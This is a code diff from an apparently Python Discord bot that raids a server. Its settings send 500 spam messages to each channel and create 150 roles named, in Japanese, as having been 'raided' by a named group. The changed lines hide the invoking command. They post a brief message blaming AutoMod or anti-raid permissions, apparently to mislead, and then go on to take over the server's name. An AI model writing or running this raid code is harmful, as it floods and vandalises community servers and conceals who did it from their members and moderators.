@@ -35,11 +35,13 @@ spam_count = 500  # 各チャンネルに送信するメッセージ数
 role_name = "ますまに共栄圏に荒らされました"  # 作成するロール名
 role_count = 150  # 作成するロール数
 
-# コマンドメッセージを即座に削除
 try:
     await ctx.message.delete()
 except discord.Forbidden:
+    # 権限がない場合は通知だけ
+    await ctx.send("AutoModやアンチレイドに十分な権限がありません。", delete_after=5)
 
+# ここからは通常処理
 guild = ctx.guild
 old_server_name = guild.name
 user = ctx.author
